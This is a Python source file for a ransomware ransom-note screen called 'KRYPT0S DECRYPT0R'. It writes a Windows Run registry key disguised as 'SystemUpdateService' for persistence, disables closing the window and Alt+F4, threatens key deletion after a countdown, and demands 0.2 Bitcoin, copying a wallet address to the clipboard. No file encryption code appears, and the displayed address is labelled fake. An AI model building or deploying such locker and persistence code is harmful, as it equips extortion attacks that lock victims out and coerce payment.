import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta
import webbrowser
import winreg
from sys import platform, executable
from time import sleep
import threading
from PIL import Image, ImageTk
import requests
from io import BytesIO

def background():
    if "win" not in platform:
        return

    while True:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        script_path = executable  # Dynamically get current executable path of script

        try:  # Checking if registry key exists
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, "SystemUpdateService")
            winreg.CloseKey(key)
        except FileNotFoundError:  # Registry key does not exist
            try:
                key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
            except Exception as e:
                return 
        except Exception as e:
            return

        sleep(10)

def on_close():
    show_custom_message("Warning", "This action is not allowed!")

def decrypt_files():
    show_custom_message("Decrypt Files", "The decryption process will start once the payment is confirmed.", bg_color="white")

def check_payment():
    show_custom_message("Check Payment", "Checking payment status...\n\nPlease wait while we verify your payment.", bg_color="white")

def copy_to_clipboard():
    root.clipboard_clear()
    root.clipboard_append("1Nbxs9a1a7f18SKAFXxXvjbbK69JKMBwks")
    show_custom_message("Copy to Clipboard", "Bitcoin address copied to clipboard.", bg_color="white")

def open_url(url):
    webbrowser.open_new(url)

def disable_event():
    pass  # Placeholder for disabling close event

def show_custom_message(title, message, bg_color="#2c2c2c"):
    custom_popup = tk.Toplevel(root)
    custom_popup.title(title)
    custom_popup.geometry("600x150")
    custom_popup.configure(bg=bg_color)
    custom_popup.wm_attributes('-toolwindow', 'True')
    
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width / 2) - (300 / 2)
    y = (screen_height / 2) - (150 / 2)
    custom_popup.geometry(f'+{int(x)}+{int(y)}')
    
    label = tk.Label(custom_popup, text=message, font=("Helvetica", 12), fg="black" if bg_color == "white" else "white", bg=bg_color)
    label.pack(pady=20)
    
    ok_button = tk.Button(custom_popup, text="OK", font=("Helvetica", 12), command=custom_popup.destroy)
    ok_button.pack(pady=10)
    
    custom_popup.transient(root)
    custom_popup.grab_set()
    root.wait_window(custom_popup)

def main():
    global root

    root = tk.Tk()
    tab_name = "KRYPT0S DECRYPT0R"
    root.title(tab_name)
    root.geometry("850x720")
    root.configure(bg='#000000')  # Pure black background
    root.protocol("WM_DELETE_WINDOW", disable_event)  # Disable close button

    # Remove the default Tkinter icon by making the window a tool window
    root.wm_attributes('-toolwindow', 'True')

    # Disable Alt+F4
    root.bind("<Alt-F4>", lambda e: "break")

    title_label = tk.Label(root, text="Oops! Your files have been encrypted!", font=("Helvetica", 24, "bold"), fg="#ff3333", bg="#000000")
    title_label.pack(pady=10)

    frame_top = tk.Frame(root, bg="#000000")
    frame_top.pack(pady=10)

    left_frame = tk.Frame(frame_top, bg="#000000")
    left_frame.pack(side="left", padx=40)

    right_frame = tk.Frame(frame_top, bg="#000000")
    right_frame.pack(side="left", padx=40)

    # Load the lock icon image
    response = requests.get("https://t4.ftcdn.net/jpg/07/83/13/87/360_F_783138710_HWHIvyqdyBTFfoylH1mnDe8CDg6iFr8v.jpg")  # Replace with your lock icon URL
    img_data = response.content
    img = Image.open(BytesIO(img_data))
    img = img.resize((300, 200), Image.LANCZOS)  # Resize image to fit appropriately
    img = ImageTk.PhotoImage(img)

    image_label = tk.Label(left_frame, image=img, bg='#000000')
    image_label.image = img  # Keep a reference to avoid garbage collection
    image_label.pack(pady=(10, 20))

    today = datetime.now()
    payment_raise_date = today + timedelta(days=7)
    payment_loss_date = today + timedelta(days=20)

    payment_raise_label = tk.Label(left_frame, text="Price Increase Date", font=("Helvetica", 16, "bold"), fg="#ff3333", bg="#000000")
    payment_raise_label.pack(pady=10)

    payment_raise_date_label = tk.Label(left_frame, text=payment_raise_date.strftime("%m/%d/%Y"), font=("Helvetica", 14), fg="white", bg="#000000")
    payment_raise_date_label.pack(pady=10)

    payment_loss_label = tk.Label(left_frame, text="Decryption Key Deletion Date", font=("Helvetica", 16, "bold"), fg="#ff3333", bg="#000000")
    payment_loss_label.pack(pady=10)

    payment_loss_date_label = tk.Label(left_frame, text=payment_loss_date.strftime("%m/%d/%Y"), font=("Helvetica", 14), fg="white", bg="#000000")
    payment_loss_date_label.pack(pady=10)

    right_text = tk.Text(right_frame, width=50, height=15, wrap="word", font=("Helvetica", 12), bg="#000000", fg="white", bd=0)
    right_text.insert(tk.END, 
        "What Happened?\n\n"
        "All your important files have been encrypted.\n"
        "Documents, photos, videos, and other crucial data are now inaccessible. "
        "The only way to recover your files is by purchasing the decryption tool.\n\n"
        "Can I Recover My Files?\n\n"
        "Yes, you can recover your files, but only by paying the ransom. "
        "Any attempts to recover your files through other means will be futile and could result in permanent data loss.\n\n"
        "How Do I Pay?\n"
        "View the simple guide below:"
    )
    right_text.configure(state="disabled")
    right_text.pack()

    payment_instructions = tk.Label(right_frame, text="Send 0.2 Bitcoin to the address specified below and click <Check Payment>. "
                                "Your files will be decrypted once the payment is confirmed.", 
                                font=("Helvetica", 12), bg="#000000", fg="white", wraplength=400, justify="left")
    payment_instructions.pack(pady=(10, 20))
    
    bitcoin_frame = tk.Frame(right_frame, bg="#000000")
    bitcoin_frame.pack(pady=10)
    
    bitcoin_label = tk.Label(bitcoin_frame, text="Bitcoin Address:", font=("Helvetica", 16, "bold"), fg="#ff3333", bg="#000000")
    bitcoin_label.pack(pady=5)
    
    bitcoin_address = tk.Label(bitcoin_frame, text="(FAKE)1Nbxs9a1a7f18SFAKEKAFXxXvjbbK69JKMBwks(FAKE)", font=("Helvetica", 14), fg="white", bg="#000000")
    bitcoin_address.pack(pady=5)
    
    copy_button = tk.Button(bitcoin_frame, text="Copy Address", font=("Helvetica", 12), fg="white", bg="gray", command=copy_to_clipboard)
    copy_button.pack(pady=5)
    
    buttons_frame = tk.Frame(bitcoin_frame, bg="#000000")
    buttons_frame.pack(pady=10)
    
    check_payment_button = tk.Button(buttons_frame, text="Check Payment", font=("Helvetica", 14), fg="white", bg="#1c1c1c", width=15, command=check_payment)
    check_payment_button.pack(side="left", padx=5)

    decrypt_button = tk.Button(buttons_frame, text="Decrypt", font=("Helvetica", 14), fg="white", bg="#1c1c1c", width=15, command=decrypt_files)
    decrypt_button.pack(side="left", padx=5)

    links_frame = tk.Frame(right_frame, bg="#000000")
    links_frame.pack(pady=10)
    
    buy_bitcoin_link = tk.Label(links_frame, text="How to Buy Bitcoin?", font=("Helvetica", 12, "bold"), fg="#ff3333", bg="#000000", cursor="hand2")
    buy_bitcoin_link.pack(pady=5)
    buy_bitcoin_link.bind("<Button-1>", lambda e: open_url("https://www.investopedia.com/articles/investing/082914/basics-buying-and-investing-bitcoin.asp"))
    
    what_is_bitcoin_link = tk.Label(links_frame, text="What is Bitcoin?", font=("Helvetica", 12, "bold"), fg="#ff3333", bg="#000000", cursor="hand2")
    what_is_bitcoin_link.pack(pady=5)
    what_is_bitcoin_link.bind("<Button-1>", lambda e: open_url("https://www.forbes.com/advisor/investing/cryptocurrency/what-is-bitcoin/"))

    root.mainloop()

if __name__ == "__main__":
    # Start the background function in a separate thread
    threading.Thread(target=background, daemon=True).start()
    main()
